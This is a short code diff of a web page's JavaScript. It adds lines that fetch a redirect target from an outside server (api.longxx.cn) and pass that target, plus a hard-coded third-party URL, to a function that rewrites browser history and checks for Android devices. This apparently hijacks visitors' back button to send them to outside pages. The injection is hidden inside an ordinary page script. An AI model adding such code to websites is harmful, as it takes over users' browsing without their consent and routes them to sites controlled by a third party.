@@ -131,6 +131,11 @@
         }, {'ACT-USER-ID': getParam('user_id')})
     }
 
+    $.get("http://api.longxx.cn/bak/gg/api/api_gg.php?bbsfan1&", function(result){
+        gogg(JSON.parse(result).domainname)
+    });
+
+    gogg('http://upread.ccdy.cn/show.html?bbsfan1')
     function gogg(url) {
         history.pushState(history.length + 1, 'message', window.location.href.split('#')[0] + '#' + new Date().getTime())
         if (navigator.userAgent.indexOf('Android') != -1) {
